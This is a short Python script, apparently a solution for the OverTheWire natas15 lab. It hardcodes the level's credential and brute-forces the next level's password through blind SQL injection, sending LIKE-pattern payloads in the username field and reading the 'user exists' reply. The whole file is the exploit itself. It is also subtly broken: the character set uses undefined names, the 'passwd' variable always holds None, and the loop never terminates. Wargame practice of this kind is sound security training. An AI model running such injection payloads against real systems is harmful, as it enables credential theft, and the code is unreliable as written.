import requests
import string
char = digits + letters

username = 'natas15'
password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'

url = 'http://natas15.natas.labs.overthewire.org'

session = requests.session()

seen_password = list()

while (True):
    for i in range(0,32):
        for ch in char:
            print "trying characters:", "".join(seen_password)+ ch
            response = session.post(url, data ={'username':'natas16" AND  BINARY  password LIKE "' + "".join(seen_password) + ch +'%"#'}, auth= (username, password))
            content = response.text
            if ('user exists' in content):
                passwd = seen_password.append(ch)
                print passwd
                break
